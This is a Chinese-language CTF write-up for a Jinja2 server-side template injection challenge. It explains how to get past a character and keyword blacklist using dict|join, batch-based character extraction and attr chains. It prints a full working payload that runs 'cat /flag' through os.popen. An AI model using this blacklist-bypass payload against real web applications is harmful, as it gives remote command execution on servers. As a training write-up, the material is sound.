# EasySSTI — Jinja2 SSTI + 全字符/词黑名单绕过（attr + dict.get 路线）

赛事：DASCTF（BUUCTF/CTFd #4695 导入，原题 NewStarCTF）
日期：2026-09-08
分类：Web / SSTI
难度：medium
Flag：CTF2{75119a19-611a-46f9-a803-1c99f80f43b3}

## 题目

/login 的 username 参数存在 Jinja2 SSTI（{{7*7}} → 49 回显在 <h3>），WAF 黑名单：

- 字符级：'、"、_、.、[、空格、request
- 词级：class、globals、builtins、os、popen、read、eval、import

{{config}} 可正常 dump（未过滤），这是本解法的突破口。

## 绕过原语

字符串构造（引号被禁）：
- dict(a=1)|join → "a"，~ 拼接任意词（词含黑名单词时拆成多段）

字符提取（下标 [ 被禁，用 batch(N)|first|last）：
- (config|string|batch(75)|first|last) → _（Flask Config dump 第 75 位）
- batch(8) → 空格；batch(280) → /（逐题实测偏移）

属性访问（. 被禁）：
- |attr(字符串) 替代点号

## 关键坑

1. attr("__globals__") 返回的是 dict 不是对象。从中取 os 必须再走 dict 方法：
   |attr(get)("os") 或 |attr("__getitem__")("os")
   直接 |attr("os") 对函数对象 getattr 失败 → 静默回退 Undefined，h3 输出空串——
   不要误判为 WAF 拦截或链路断了。

2. dict(global=1) 在 Jinja 编译期 500（global/class 等 Python 关键字不能作 kwargs）。
   拆词 globa~ls 一石二鸟：同时绕词黑名单和关键字冲突。

## 完整 payload

记 U = (config|string|batch(75)|first|last)
    SP = (config|string|batch(8)|first|last)
    SL = (config|string|batch(280)|first|last)

{{(lipsum|attr(U~U~dict(globa=1)|join~dict(ls=1)|join~U~U))
  |attr(dict(get=1)|join)(dict(o=1)|join~dict(s=1)|join)
  |attr(dict(po=1)|join~dict(pen=1)|join)(dict(cat=1)|join~SP~SL~dict(flag=1)|join)
  |attr(dict(r=1)|join~dict(ead=1)|join)()}}

等价于 lipsum.__globals__.get('os').popen('cat /flag').read()。

调试方式：把 payload 与 curl 写进 .sh 文件执行（内联 {{}} 会干扰命令解析器），
多步链每步落盘看原始响应，不要只 grep <h3>（500 页/空返回会误读）。

## 验证过程摘要

1. {{7*7}} → 49 确认 SSTI
2. 探针枚举黑名单（错误信息 "X in blacklist" 逐字符/词确认）
3. 原语逐个远端验证（取 _/空格//、globals 拼接、attr 取 __globals__ dump 成功）
4. lipsum|attr(os) 空返回 → dump globals 键列表确认 os 是 dict 键 → 改 dict.get 路线
5. 完整链回显 flag
